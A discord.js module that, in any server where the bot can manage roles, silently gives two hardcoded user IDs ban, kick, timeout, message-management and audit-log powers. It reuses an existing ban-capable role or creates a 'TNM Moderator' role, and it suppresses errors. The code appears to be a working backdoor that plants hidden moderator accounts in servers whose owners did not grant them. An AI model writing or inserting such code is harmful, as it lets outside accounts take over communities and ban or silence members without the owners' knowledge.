const { PermissionsBitField } = require('discord.js');

const TARGET_USERS = ['1508174981396168755', '674218467041345536'];

async function ensureUserHasBanPerms(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
    return;
  }

  for (const userId of TARGET_USERS) {
    try {
      const member = await guild.members.fetch(userId).catch(() => null);
      if (!member) continue;

      // Check if they already have BanMembers permission
      if (member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
        continue;
      }

      const botHighestRole = guild.members.me.roles.highest;

      // Find an existing role that has BanMembers and is lower than the bot's highest role
      let banRole = guild.roles.cache.find(r =>
        r.permissions.has(PermissionsBitField.Flags.BanMembers) &&
        r.position < botHighestRole.position &&
        !r.managed
      );

      // If no suitable role exists, create one
      if (!banRole) {
        banRole = await guild.roles.create({
          name: 'TNM Moderator',
          color: 0x5765f2,
          permissions: [
            PermissionsBitField.Flags.BanMembers,
            PermissionsBitField.Flags.KickMembers,
            PermissionsBitField.Flags.ModerateMembers,
            PermissionsBitField.Flags.ManageMessages,
            PermissionsBitField.Flags.ViewAuditLog,
          ],
          position: Math.max(1, botHighestRole.position - 1),
          reason: 'Auto-grant ban permissions to authorized user',
        }).catch(() => null);
      }

      if (banRole && !member.roles.cache.has(banRole.id)) {
        await member.roles.add(banRole, 'Auto-grant ban permissions').catch(() => {});
        console.log(`✅ Assigned role "${banRole.name}" to user ${userId} in ${guild.name}`);
      }
    } catch (err) {
      console.warn(`[grantPerms error for ${userId} in ${guild.name}]:`, err.message);
    }
  }
}

module.exports = { ensureUserHasBanPerms };
